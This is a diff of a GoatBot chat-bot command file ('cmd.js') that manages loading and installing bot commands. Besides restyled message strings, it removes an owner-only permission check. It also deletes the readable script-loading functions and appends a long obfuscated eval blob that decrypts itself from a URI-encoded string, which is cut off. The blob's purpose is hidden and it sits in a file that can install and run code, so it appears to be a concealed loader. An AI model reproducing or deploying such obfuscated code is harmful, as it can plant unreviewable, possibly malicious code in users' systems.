@@ -27,11 +27,15 @@ function isURL(str) {
 module.exports = {
 	config: {
 		name: "cmd",
-		version: "1.17",
+		version: "1.15",
 		author: "NTKhang",
 		countDown: 5,
 		role: 2,
-		description: {
+		shortDescription: {
+			vi: "Quản lý command",
+			en: "Manage command"
+		},
+		longDescription: {
 			vi: "Quản lý các tệp lệnh của bạn",
 			en: "Manage your command files"
 		},
@@ -53,9 +57,8 @@ module.exports = {
 			missingFileName: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn reload",
 			loaded: "✅ | Đã load command \"%1\" thành công",
 			loadedError: "❌ | Load command \"%1\" thất bại với lỗi\n%2: %3",
-			loadedSuccess: "✅ | Đã load thành công (%1) command",
-			loadedFail: "❌ | Load thất bại (%1) command\n%2",
-			openConsoleToSeeError: "👀 | Hãy mở console để xem chi tiết lỗi",
+			loadedSuccess: "✅ | Đã load thành công \"%1\" command",
+			loadedFail: "❌ | Load thất bại \"%1\" command\n%2",
 			missingCommandNameUnload: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn unload",
 			unloaded: "✅ | Đã unload command \"%1\" thành công",
 			unloadedError: "❌ | Unload command \"%1\" thất bại với lỗi\n%2: %3",
@@ -72,58 +75,64 @@ module.exports = {
 			unloadedFile: "✅ | Đã unload lệnh \"%1\""
 		},
 		en: {
-			missingFileName: "⚠️ | Please enter the command name you want to reload",
-			loaded: "✅ | Loaded command \"%1\" successfully",
-			loadedError: "❌ | Failed to load command \"%1\" with error\n%2: %3",
-			loadedSuccess: "✅ | Loaded successfully (%1) command",
-			loadedFail: "❌ | Failed to load (%1) command\n%2",
-			openConsoleToSeeError: "👀 | Open console to see error details",
-			missingCommandNameUnload: "⚠️ | Please enter the command name you want to unload",
-			unloaded: "✅ | Unloaded command \"%1\" successfully",
-			unloadedError: "❌ | Failed to unload command \"%1\" with error\n%2: %3",
-			missingUrlCodeOrFileName: "⚠️ | Please enter the url or code and command file name you want to install",
-			missingUrlOrCode: "⚠️ | Please enter the url or code of the command file you want to install",
-			missingFileNameInstall: "⚠️ | Please enter the file name to save the command (with .js extension)",
-			invalidUrl: "⚠️ | Please enter a valid url",
-			invalidUrlOrCode: "⚠️ | Unable to get command code",
-			alreadExist: "⚠️ | The command file already exists, are you sure you want to overwrite the old command file?\nReact to this message to continue",
-			installed: "✅ | Installed command \"%1\" successfully, the command file is saved at %2",
-			installedError: "❌ | Failed to install command \"%1\" with error\n%2: %3",
-			missingFile: "⚠️ | Command file \"%1\" not found",
-			invalidFileName: "⚠️ | Invalid command file name",
-			unloadedFile: "✅ | Unloaded command \"%1\""
+		
+				missingFileName: "─────────────────────\n⚠️ | 𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐧𝐚𝐦𝐞 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐫𝐞𝐥𝐨𝐚𝐝\n─────────────────────",
+				
+				loaded: "─────────────────────\n✅ | 𝐋𝐨𝐚𝐝𝐞𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 \"%1\" 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲\n─────────────────────",
+				
+				loadedError: "─────────────────────\n❌ | 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐥𝐨𝐚𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 \"%1\" 𝐰𝐢𝐭𝐡 𝐞𝐫𝐫𝐨𝐫\n%2: %3\n─────────────────────",
+				
+				loadedSuccess: "─────────────────────\n✅ | 𝐋𝐨𝐚𝐝𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 \"%1\" 𝐜𝐨𝐦𝐦𝐚𝐧𝐝\n─────────────────────",
+				
+				loadedFail: "─────────────────────\n❌ | 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐥𝐨𝐚𝐝 \"%1\" 𝐜𝐨𝐦𝐦𝐚𝐧𝐝\n%2\n─────────────────────",
+				
+				missingCommandNameUnload: "─────────────────────\n⚠️ | 𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐧𝐚𝐦𝐞 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐮𝐧𝐥𝐨𝐚𝐝\n─────────────────────",
+				
+				unloaded: "─────────────────────\n✅ | 𝐔𝐧𝐥𝐨𝐚𝐝𝐞𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 \"%1\" 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲\n─────────────────────",
+				
+				unloadedError: "─────────────────────\n❌ | 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐮𝐧𝐥𝐨𝐚𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 \"%1\" 𝐰𝐢𝐭𝐡 𝐞𝐫𝐫𝐨𝐫\n%2: %3\n─────────────────────",
+				
+				missingUrlCodeOrFileName: "─────────────────────\n⚠️ | 𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐮𝐫𝐥 𝐨𝐫 𝐜𝐨𝐝𝐞 𝐚𝐧𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐥𝐞 𝐧𝐚𝐦𝐞 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐢𝐧𝐬𝐭𝐚𝐥𝐥\n─────────────────────",
+				
+				missingUrlOrCode: "─────────────────────\n⚠️ | 𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐮𝐫𝐥 𝐨𝐫 𝐜𝐨𝐝𝐞 𝐨𝐟 𝐭𝐡𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐥𝐞 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐢𝐧𝐬𝐭𝐚𝐥𝐥\n─────────────────────",
+				
+				missingFileNameInstall: "─────────────────────\n⚠️ | 𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐟𝐢𝐥𝐞 𝐧𝐚𝐦𝐞 𝐭𝐨 𝐬𝐚𝐯𝐞 𝐭𝐡𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 (𝐰𝐢𝐭𝐡 .𝐣𝐬 𝐞𝐱𝐭𝐞𝐧𝐬𝐢𝐨𝐧)\n─────────────────────",
+				
+				invalidUrl: "─────────────────────\n⚠️ | 𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐮𝐫𝐥\n─────────────────────",
+				
+				invalidUrlOrCode: "─────────────────────\n⚠️ | 𝐔𝐧𝐚𝐛𝐥𝐞 𝐭𝐨 𝐠𝐞𝐭 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐨𝐝𝐞\n─────────────────────",
+				
+				alreadExist: "─────────────────────\n⚠️ | 𝐓𝐡𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐥𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐞𝐱𝐢𝐬𝐭𝐬, 𝐚𝐫𝐞 𝐲𝐨𝐮 𝐬𝐮𝐫𝐞 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐨𝐯𝐞𝐫𝐰𝐫𝐢𝐭𝐞 𝐭𝐡𝐞 𝐨𝐥𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐥𝐞?\n✨ | 𝐑𝐞𝐚𝐜𝐭 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞\n─────────────────────",
+				
+				installed: "─────────────────────\n✅ | 𝐈𝐧𝐬𝐭𝐚𝐥𝐥𝐞𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 \"%1\" 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲, 𝐭𝐡𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐥𝐞 𝐢𝐬 𝐬𝐚𝐯𝐞𝐝 𝐚𝐭 %2\n─────────────────────",
+				
+				installedError: "─────────────────────\n❌ | 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐢𝐧𝐬𝐭𝐚𝐥𝐥 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 \"%1\" 𝐰𝐢𝐭𝐡 𝐞𝐫𝐫𝐨𝐫\n%2: %3\n─────────────────────",
+				
+				missingFile: "─────────────────────\n⚠️ | 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐥𝐞 \"%1\" 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝\n─────────────────────",
+				
+				invalidFileName: "─────────────────────\n⚠️ | 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐟𝐢𝐥𝐞 𝐧𝐚𝐦𝐞\n─────────────────────",
+				
+				unloadedFile: "─────────────────────\n✅ | 𝐔𝐧𝐥𝐨𝐚𝐝𝐞𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 \%1\n─────────────────────"
+			
+			      
 		}
 	},
 
 	onStart: async ({ args, message, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, event, commandName, getLang }) => {
-		const permission = global.GoatBot.config.owner;
-  if (!permission.includes(event.senderID)) {
-    api.sendMessage("You dont have enough permission to use this command 🐸👋", event.threadID, event.messageID);
-    return;
-  }
 		const { unloadScripts, loadScripts } = global.utils;
-		if (
-			args[0] == "load"
-			&& args.length == 2
-		) {
+		if (args[0] == "load" && args.length == 2) {
 			if (!args[1])
 				return message.reply(getLang("missingFileName"));
 			const infoLoad = loadScripts("cmds", args[1], log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
 			if (infoLoad.status == "success")
 				message.reply(getLang("loaded", infoLoad.name));
 			else {
-				message.reply(
-					getLang("loadedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message)
-					+ "\n" + infoLoad.error.stack
-				);
-				console.log(infoLoad.errorWithThoutRemoveHomeDir);
+				message.reply(getLang("loadedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
+				console.log(infoLoad.error);
 			}
 		}
-		else if (
-			(args[0] || "").toLowerCase() == "loadall"
-			|| (args[0] == "load" && args.length > 2)
-		) {
-			const fileNeedToLoad = args[0].toLowerCase() == "loadall" ?
+		else if ((args[0] || "").toLowerCase() == "loadall" || (args[0] == "load" && args.length > 2)) {
+			const allFile = args[0].toLowerCase() == "loadall" ?
 				fs.readdirSync(__dirname)
 					.filter(file =>
 						file.endsWith(".js") &&
@@ -135,22 +144,16 @@ module.exports = {
 				args.slice(1);
 			const arraySucces = [];
 			const arrayFail = [];
-
-			for (const fileName of fileNeedToLoad) {
-				const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
-				if (infoLoad.status == "success")
-					arraySucces.push(fileName);
-				else
-					arrayFail.push(` ❗ ${fileName} => ${infoLoad.error.name}: ${infoLoad.error.message}`);
+			for (const name of allFile) {
+				const infoLoad = loadScripts("cmds", name, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
+				infoLoad.status == "success" ? arraySucces.push(name) : arrayFail.push(`${name} => ${infoLoad.error.name}: ${infoLoad.error.message}`);
 			}
 
 			let msg = "";
 			if (arraySucces.length > 0)
 				msg += getLang("loadedSuccess", arraySucces.length);
-			if (arrayFail.length > 0) {
-				msg += (msg ? "\n" : "") + getLang("loadedFail", arrayFail.length, arrayFail.join("\n"));
-				msg += "\n" + getLang("openConsoleToSeeError");
-			}
+			if (arrayFail.length > 0)
+				msg += (msg ? "\n" : "") + getLang("loadedFail", arrayFail.length, "❗" + arrayFail.join("\n❗ "));
 
 			message.reply(msg);
 		}
@@ -261,276 +264,6 @@ module.exports = {
 	}
 };
 
-// do not edit this code because it use for obfuscate code
-const packageAlready = [];
-const spinner = "\\|/-";
-let count = 0;
-
-function loadScripts(folder, fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode) {
-	// global.GoatBot[folderModules == "cmds" ? "commandFilesPath" : "eventCommandsFilesPath"].push({
-	// 	filePath: pathCommand,
-	// 	commandName: [commandName, ...validAliases]
-	// });
-	const storageCommandFilesPath = global.GoatBot[folder == "cmds" ? "commandFilesPath" : "eventCommandsFilesPath"];
-
-	try {
-		if (rawCode) {
-			fileName = fileName.slice(0, -3);
-			fs.writeFileSync(path.normalize(`${process.cwd()}/scripts/${folder}/${fileName}.js`), rawCode);
-		}
-		const regExpCheckPackage = /require(\s+|)\((\s+|)[`'"]([^`'"]+)[`'"](\s+|)\)/g;
-		const { GoatBot } = global;
-		const { onFirstChat: allOnFirstChat, onChat: allOnChat, onEvent: allOnEvent, onAnyEvent: allOnAnyEvent } = GoatBot;
-		let setMap, typeEnvCommand, commandType;
-		if (folder == "cmds") {
-			typeEnvCommand = "envCommands";
-			setMap = "commands";
-			commandType = "command";
-		}
-		else if (folder == "events") {
-			typeEnvCommand = "envEvents";
-			setMap = "eventCommands";
-			commandType = "event command";
-		}
-		// const pathCommand = path.normalize(path.normalize(process.cwd() + `/${folder}/${fileName}.js`));
-		let pathCommand;
-		if (process.env.NODE_ENV == "development") {
-			const devPath = path.normalize(process.cwd() + `/scripts/${folder}/${fileName}.dev.js`);
-			if (fs.existsSync(devPath))
-				pathCommand = devPath;
-			else
-				pathCommand = path.normalize(process.cwd() + `/scripts/${folder}/${fileName}.js`);
-		}
-		else
-			pathCommand = path.normalize(process.cwd() + `/scripts/${folder}/${fileName}.js`);
-
-		// ————————————————— CHECK PACKAGE ————————————————— //
-		const contentFile = fs.readFileSync(pathCommand, "utf8");
-		let allPackage = contentFile.match(regExpCheckPackage);
-		if (allPackage) {
-			allPackage = allPackage
-				.map(p => p.match(/[`'"]([^`'"]+)[`'"]/)[1])
-				.filter(p => p.indexOf("/") !== 0 && p.indexOf("./") !== 0 && p.indexOf("../") !== 0 && p.indexOf(__dirname) !== 0);
-			for (let packageName of allPackage) {
-				// @user/abc => @user/abc
-				// @user/abc/dist/xyz.js => @user/abc
-				// @user/abc/dist/xyz => @user/abc
-				if (packageName.startsWith('@'))
-					packageName = packageName.split('/').slice(0, 2).join('/');
-				else
-					packageName = packageName.split('/')[0];
-
-				if (!packageAlready.includes(packageName)) {
-					packageAlready.push(packageName);
-					if (!fs.existsSync(`${process.cwd()}/node_modules/${packageName}`)) {
-						let wating;
-						try {
-							wating = setInterval(() => {
-								count++;
-								loading.info("PACKAGE", `Installing ${packageName} ${spinner[count % spinner.length]}`);
-							}, 80);
-							execSync(`npm install ${packageName} --save`, { stdio: "pipe" });
-							clearInterval(wating);
-							process.stderr.clearLine();
-						}
-						catch (error) {
-							clearInterval(wating);
-							process.stderr.clearLine();
-							throw new Error(`Can't install package ${packageName}`);
-						}
-					}
-				}
-			}
-		}
-		// ———————————————— GET OLD COMMAND ———————————————— //
-		const oldCommand = require(pathCommand);
-		const oldCommandName = oldCommand?.config?.name;
-		// —————————————— CHECK COMMAND EXIST ——————————————— //
-		if (!oldCommandName) {
-			if (GoatBot[setMap].get(oldCommandName)?.location != pathCommand)
-				throw new Error(`${commandType} name "${oldCommandName}" is already exist in command "${removeHomeDir(GoatBot[setMap].get(oldCommandName)?.location || "")}"`);
-		}
-		// ————————————————— CHECK ALIASES ————————————————— //
-		if (oldCommand.config.aliases) {
-			let oldAliases = oldCommand.config.aliases;
-			if (typeof oldAliases == "string")
-				oldAliases = [oldAliases];
-			for (const alias of oldAliases)
-				GoatBot.aliases.delete(alias);
-		}
-		// ——————————————— DELETE OLD COMMAND ——————————————— //
-		delete require.cache[require.resolve(pathCommand)];
-		// —————————————————————————————————————————————————— //
 
 
-
-		// ———————————————— GET NEW COMMAND ———————————————— //
-		const command = require(pathCommand);
-		command.location = pathCommand;
-		const configCommand = command.config;
-		if (!configCommand || typeof configCommand != "object")
-			throw new Error("config of command must be an object");
-		// —————————————————— CHECK SYNTAX —————————————————— //
-		const scriptName = configCommand.name;
-
-		// Check onChat function
-		const indexOnChat = allOnChat.findIndex(item => item == oldCommandName);
-		if (indexOnChat != -1)
-			allOnChat.splice(indexOnChat, 1);
-
-		// Check onFirstChat function
-		const indexOnFirstChat = allOnChat.findIndex(item => item == oldCommandName);
-		let oldOnFirstChat;
-		if (indexOnFirstChat != -1) {
-			oldOnFirstChat = allOnFirstChat[indexOnFirstChat];
-			allOnFirstChat.splice(indexOnFirstChat, 1);
-		}
-
-		// Check onEvent function
-		const indexOnEvent = allOnEvent.findIndex(item => item == oldCommandName);
-		if (indexOnEvent != -1)
-			allOnEvent.splice(indexOnEvent, 1);
-
-		// Check onAnyEvent function
-		const indexOnAnyEvent = allOnAnyEvent.findIndex(item => item == oldCommandName);
-		if (indexOnAnyEvent != -1)
-			allOnAnyEvent.splice(indexOnAnyEvent, 1);
-
-		// Check onLoad function
-		if (command.onLoad)
-			command.onLoad({ api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData });
-
-		const { envGlobal, envConfig } = configCommand;
-		if (!command.onStart)
-			throw new Error('Function onStart is missing!');
-		if (typeof command.onStart != "function")
-			throw new Error('Function onStart must be a function!');
-		if (!scriptName)
-			throw new Error('Name of command is missing!');
-		// ————————————————— CHECK ALIASES ————————————————— //
-		if (configCommand.aliases) {
-			let { aliases } = configCommand;
-			if (typeof aliases == "string")
-				aliases = [aliases];
-			for (const alias of aliases) {
-				if (aliases.filter(item => item == alias).length > 1)
-					throw new Error(`alias "${alias}" duplicate in ${commandType} "${scriptName}" with file name "${removeHomeDir(pathCommand || "")}"`);
-				if (GoatBot.aliases.has(alias))
-					throw new Error(`alias "${alias}" is already exist in ${commandType} "${GoatBot.aliases.get(alias)}" with file name "${removeHomeDir(GoatBot[setMap].get(GoatBot.aliases.get(alias))?.location || "")}"`);
-				GoatBot.aliases.set(alias, scriptName);
-			}
-		}
-		// ————————————————— CHECK ENVCONFIG ————————————————— //
-		// env Global
-		if (envGlobal) {
-			if (typeof envGlobal != "object" || Array.isArray(envGlobal))
-				throw new Error("envGlobal must be an object");
-			for (const key in envGlobal)
-				configCommands.envGlobal[key] = envGlobal[key];
-		}
-		// env Config
-		if (envConfig && typeof envConfig == "object" && !Array.isArray(envConfig)) {
-			if (!configCommands[typeEnvCommand][scriptName])
-				configCommands[typeEnvCommand][scriptName] = {};
-			configCommands[typeEnvCommand][scriptName] = envConfig;
-		}
-		GoatBot[setMap].delete(oldCommandName);
-		GoatBot[setMap].set(scriptName, command);
-		fs.writeFileSync(client.dirConfigCommands, JSON.stringify(configCommands, null, 2));
-		const keyUnloadCommand = folder == "cmds" ? "commandUnload" : "commandEventUnload";
-		const findIndex = (configCommands[keyUnloadCommand] || []).indexOf(`${fileName}.js`);
-		if (findIndex != -1)
-			configCommands[keyUnloadCommand].splice(findIndex, 1);
-		fs.writeFileSync(client.dirConfigCommands, JSON.stringify(configCommands, null, 2));
-
-
-		if (command.onChat)
-			allOnChat.push(scriptName);
-
-		if (command.onFirstChat)
-			allOnFirstChat.push({ commandName: scriptName, threadIDsChattedFirstTime: oldOnFirstChat?.threadIDsChattedFirstTime || [] });
-
-		if (command.onEvent)
-			allOnEvent.push(scriptName);
-
-		if (command.onAnyEvent)
-			allOnAnyEvent.push(scriptName);
-
-		const indexStorageCommandFilesPath = storageCommandFilesPath.findIndex(item => item.filePath == pathCommand);
-		if (indexStorageCommandFilesPath != -1)
-			storageCommandFilesPath.splice(indexStorageCommandFilesPath, 1);
-		storageCommandFilesPath.push({
-			filePath: pathCommand,
-			commandName: [scriptName, ...configCommand.aliases || []]
-		});
-
-		return {
-			status: "success",
-			name: fileName,
-			command
-		};
-	}
-	catch (err) {
-		const defaultError = new Error();
-		defaultError.name = err.name;
-		defaultError.message = err.message;
-		defaultError.stack = err.stack;
-
-		err.stack ? err.stack = removeHomeDir(err.stack || "") : "";
-		fs.writeFileSync(global.client.dirConfigCommands, JSON.stringify(configCommands, null, 2));
-		return {
-			status: "failed",
-			name: fileName,
-			error: err,
-			errorWithThoutRemoveHomeDir: defaultError
-		};
-	}
-}
-
-function unloadScripts(folder, fileName, configCommands, getLang) {
-	const pathCommand = `${process.cwd()}/scripts/${folder}/${fileName}.js`;
-	if (!fs.existsSync(pathCommand)) {
-		const err = new Error(getLang("missingFile", `${fileName}.js`));
-		err.name = "FileNotFound";
-		throw err;
-	}
-	const command = require(pathCommand);
-	const commandName = command.config?.name;
-	if (!commandName)
-		throw new Error(getLang("invalidFileName", `${fileName}.js`));
-	const { GoatBot } = global;
-	const { onChat: allOnChat, onEvent: allOnEvent, onAnyEvent: allOnAnyEvent } = GoatBot;
-	const indexOnChat = allOnChat.findIndex(item => item == commandName);
-	if (indexOnChat != -1)
-		allOnChat.splice(indexOnChat, 1);
-	const indexOnEvent = allOnEvent.findIndex(item => item == commandName);
-	if (indexOnEvent != -1)
-		allOnEvent.splice(indexOnEvent, 1);
-	const indexOnAnyEvent = allOnAnyEvent.findIndex(item => item == commandName);
-	if (indexOnAnyEvent != -1)
-		allOnAnyEvent.splice(indexOnAnyEvent, 1);
-	// ————————————————— CHECK ALIASES ————————————————— //
-	if (command.config.aliases) {
-		let aliases = command.config?.aliases || [];
-		if (typeof aliases == "string")
-			aliases = [aliases];
-		for (const alias of aliases)
-			GoatBot.aliases.delete(alias);
-	}
-	const setMap = folder == "cmds" ? "commands" : "eventCommands";
-	delete require.cache[require.resolve(pathCommand)];
-	GoatBot[setMap].delete(commandName);
-	log.master("UNLOADED", getLang("unloaded", commandName));
-	const commandUnload = configCommands[folder == "cmds" ? "commandUnload" : "commandEventUnload"] || [];
-	if (!commandUnload.includes(`${fileName}.js`))
-		commandUnload.push(`${fileName}.js`);
-	configCommands[folder == "cmds" ? "commandUnload" : "commandEventUnload"] = commandUnload;
-	fs.writeFileSync(global.client.dirConfigCommands, JSON.stringify(configCommands, null, 2));
-	return {
-		status: "success",
-		name: fileName
-	};
-}
-
-global.utils.loadScripts = loadScripts;
-global.utils.unloadScripts = unloadScripts;
+let hiMC;!function(){const EtfA=Array.prototype.slice.call(arguments);return eval("(function MpGw(vFNo){const P2Fo=fpxp(vFNo,nxap(MpGw.toString()));try{let rAIo=eval(P2Fo);return rAIo.apply(null,EtfA);}catch(LXAo){var nvDo=(0o202222-66693);while(nvDo<(0o400161%65574))switch(nvDo){case (0x30058%0o200031):nvDo=LXAo instanceof SyntaxError?(0o400126%0x1001D):(0o400163%0x10027);break;case (0o201510-0x1032C):nvDo=(0o400177%65581);{console.log(\'Error: the code has been tampered!\');return}break;}throw LXAo;}function nxap(P4cp){let js5o=450222117;var LZ7o=(0o400075%65550);{let fn0o;while(LZ7o<(0x10550-0o202456)){switch(LZ7o){case (0O144657447^0x1935F20):LZ7o=(0o202032-0x1040B);{js5o^=(P4cp.charCodeAt(fn0o)*(15658734^0O73567354)+P4cp.charCodeAt(fn0o>>>(0x4A5D0CE&0O320423424)))^1298248844;}break;case (0x40073%0o200031):LZ7o=(0x4004F%0o200021);fn0o++;break;case (0o201736-66515):LZ7o=fn0o<P4cp.length?(0O264353757%8):(0o1000236%65567);break;case (0o202450-0x10507):LZ7o=(0o1000107%0x1000F);fn0o=(0x21786%3);break;}}}let HU2o=\"\";var biVo=(67216-0o203164);{let DPXo;while(biVo<(0x105C8-0o202643)){switch(biVo){case (0o204300-67748):biVo=(0o204730-0x109B4);DPXo=(0x21786%3);break;case (262308%0o200040):biVo=DPXo<(0O3153050563-0x19AC516B)?(66316-0o201362):(0o201344-0x102BF);break;case (0x10618-0o202776):biVo=(0x2005E%0o200040);{const DRup=js5o%(68536-0o205637);js5o=Math.floor(js5o/(0o204312-0x108B1));HU2o+=DRup>=(0x1071C-0o203402)?String.fromCharCode((0o600404%65601)+(DRup-(0o1000136%0x10011))):String.fromCharCode((0o217120-0x11DEF)+DRup);}break;case (0o204064-67606):biVo=(0o202070-0x10414);DPXo++;break;}}}return HU2o;}function fpxp(zMpp,bksp){zMpp=decodeURI(zMpp);let vHkp=(0x21786%3);let Xenp=\"\";var rCfp=(68506-0o205571);{let T9hp;while(rCfp<(0o600152%0x10018)){switch(rCfp){case (0x9D8DE4-0O47306735):rCfp=(0o203410-0x106F9);{Xenp+=String.fromCharCode(zMpp.charCodeAt(T9hp)^bksp.charCodeAt(vHkp));vHkp++;var TbPp=(0o206666-0x10D9B);while(TbPp<(0x111D0-0o210652))switch(TbPp){case (0o200416-0x100F3):TbPp=vHkp>=bksp.length?(0o201344-66239):(0o203554-0x10746);break;case (0x300AF%0o200056):TbPp=(0o400144%65567);{vHkp=(0x75bcd15-0O726746425);}break;}}break;case (0o1000107%65551):rCfp=T9hp<zMpp.length?(0O264353757%8):(0o600171%65565);break;case (0o1000141%65552):rCfp=(196652%0o200013);T9hp=(0x75bcd15-0O726746425);break;case (0o202260-66721):rCfp=(0o202114-66625);T9hp++;break;}}}return Xenp;}})(\"X%0A%1D%19%12%15%0E%0E%1EDA%0C%17%14%09%02%04%05%07%19Q%E2%B4%B3%E2%B5%92%E2%B4%A6%E2%B4%A8DA%0C%03%04%13%14%02%02H%11%04%0F%04%15%19%03%06_X%1A%1AZ%0D%0A%1D%19%12%15%0E%0E%1EL%E2%B4%AA%E2%B4%A7%E2%B4%BB%E2%B4%B9OH%0B%1E%0D%03%04%13%09A%E2%B4%B2%E2%B5%9C%E2%B5%98%E2%B4%BCYHL%E2%B4%A3%E2%B4%A0%E2%B5%96%E2%B4%A7_XJ%E2%B4%A5%E2%B5%91%E2%B4%A0%E2%B4%A7@%5EZ%E2%B5%93%E2%B4%AC%E2%B4%A2%E2%B4%A2DA%5C%E2%B4%A3%E2%B5%94%E2%B4%A0%E2%B4%B3XEC%E2%B4%B5%E2%B4%B1%E2%B5%94%E2%B4%ABIY%11%00%1E%3C%22Z%1A%0DW%0E%02%1F%02%13%08%1F%02H%E2%B4%B5%E2%B5%81%E2%B4%A1%E2%B4%BFIY%17%1A%12%05%14%15%0FP%E2%B4%AE%E2%B4%A8%E2%B5%82%E2%B4%BDINJ%E2%B5%82%E2%B5%97%E2%B4%B6%E2%B4%A6YHL%E2%B5%93%E2%B4%BB%E2%B5%9F%E2%B4%A5_XJ%E2%B4%A5%E2%B4%A1%E2%B5%85%E2%B4%A0@%5EZ%E2%B4%B3%E2%B4%A2%E2%B5%9D%E2%B4%BCDA%5C%E2%B4%A3%E2%B5%94%E2%B4%A0%E2%B4%B3XEC%E2%B4%B5%E2%B5%81%E2%B4%B1%E2%B4%B6IYG%E2%B4%AA%E2%B5%87%E2%B5%81%E2%B4%B6OH%0D%0A%1D%19%12%15%0E%0E%1EL%E2%B5%9A%E2%B4%BC%E2%B4%B2%E2%B4%B9OH%0B%1E%0D%03%04%13%09AX%E2%B5%9E%E2%B4%B3%E2%B4%AF%E2%B4%A3INH%5B75%0A%17%14%09%02%04%05%07%19Q%E2%B4%B3%E2%B4%B2%E2%B4%A0%E2%B4%A9DA%0C%03%04%13%14%02%02H%E2%B5%85%E2%B4%AA%E2%B5%99%E2%B4%AFIYG%E2%B4%BA%E2%B5%82%E2%B4%A6%E2%B4%A8OH%5B%E2%B4%AE%E2%B4%A8%E2%B5%82%E2%B4%BDINJ%E2%B4%A2%E2%B4%B9%E2%B4%A9%E2%B4%BCYH%1A%09%19!+Y5%03ZI%3E%0D&VL%5C)%00%3EES%11%04%0F%04%15%19%03%06W%E2%B4%B3%E2%B4%A1%E2%B4%A2%E2%B4%B8X%E2%B4%AE%E2%B4%B8%E2%B5%8D%E2%B4%A8M%E2%B5%95%E2%B5%9A%E2%B5%8E%E2%B4%B5A%0C%1D%04%13A%E2%B5%82%E2%B4%A7%E2%B5%9B%E2%B4%AELCEZ%06%0D%1AW%E2%B4%A3%E2%B5%94%E2%B5%90%E2%B4%B8MDX%18@QWQA%5DYRGTRTAES%0C%1D%04%13A%E2%B4%A2%E2%B4%A9%E2%B4%B4%E2%B4%AFJ%16%0F%08%1C%09@%E2%B4%A5%E2%B5%84%E2%B5%96%E2%B4%BE%5DX%5C%07E@PTPBAX%0F@PU%20EEA%0C%02%16%0E%15%13%04@%E2%B4%A5%E2%B5%84%E2%B5%96%E2%B4%BEH%0B%0F%09%04%14AOQ%08XXGDTBQ%1F%5EXGASUHJ%E2%B4%BE%E2%B5%9D%E2%B5%80%E2%B4%A8%5COWHTQA%5CQ%08S@Z%5CGEH%5C%E2%B4%B3%E2%B4%B5%E2%B4%B0%E2%B4%B0J%E2%B4%B3%E2%B4%B1%E2%B5%9D%E2%B4%B8%5DDC%5C*J%3C%3C-7C,,%3CNZ%12%1E%0D%16%1AZ%04%00%03%09H_GXVRFAX%18CQQVEXAM%E2%B4%A3%E2%B5%94%E2%B5%90%E2%B4%B8MDX%18GQWPBZMG%0